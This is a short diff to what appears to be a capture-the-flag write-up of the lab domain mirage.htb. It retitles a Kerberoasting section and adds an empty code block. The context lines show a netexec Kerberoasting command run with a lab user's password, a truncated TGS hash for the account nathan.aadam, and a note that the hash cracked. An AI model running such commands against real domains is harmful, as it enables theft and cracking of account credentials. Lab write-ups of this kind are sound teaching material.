@@ -408,7 +408,7 @@ SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackso
 
 The credentials get me access on the domain
 
-# Kerberoasting leads to user compromise
+# Kerberoasting leads to user compromise of `nathan.aadam`
 
 ```python
 ❯❯❯ faketime -f +7h nxc ldap dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --kerberoasting kerb.hash
@@ -432,7 +432,9 @@ $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$b02d96bed6193309f8
 
 The hash cracked!
 
+```python
 
+```
 
 
 
